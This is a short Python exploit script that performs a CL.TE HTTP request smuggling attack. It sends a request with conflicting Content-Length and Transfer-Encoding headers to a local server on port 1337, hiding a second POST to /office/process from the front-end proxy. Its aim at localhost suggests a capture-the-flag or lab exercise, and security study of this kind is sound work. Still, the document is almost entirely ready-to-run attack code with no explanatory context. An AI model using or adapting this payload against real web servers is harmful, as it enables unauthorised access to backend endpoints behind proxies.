import socket

HOST = "127.0.0.1"
PORT = 1337

def raw(req_bytes, read_time=3):
    s = socket.create_connection((HOST, PORT), timeout=read_time)
    s.sendall(req_bytes)
    resp = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    s.close()
    return resp

# Smuggled request hidden in the "chunked" body, visible to backend if it
# prioritizes Transfer-Encoding, invisible to proxy if it uses Content-Length.
smuggled = (
    b"POST /office/process HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Content-Type: multipart/form-data; boundary=----X\r\n"
    b"Content-Length: 10000\r\n\r\n"
    b"A"  # tiny body so a naive CL-based read on the smuggled req would hang/differ
)

# CL.TE: front-end uses Content-Length (small), back-end uses Transfer-Encoding (chunked)
chunked_body = b"0\r\n\r\n"  # terminates chunked body immediately
req_clte = (
    b"POST / HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Content-Type: text/plain\r\n"
    b"Content-Length: 4\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    + chunked_body
    + smuggled
)

print("=== CL.TE attempt ===")
resp = raw(req_clte)
print(resp[:300])
print("...")
print(resp[-300:] if len(resp) > 300 else "")
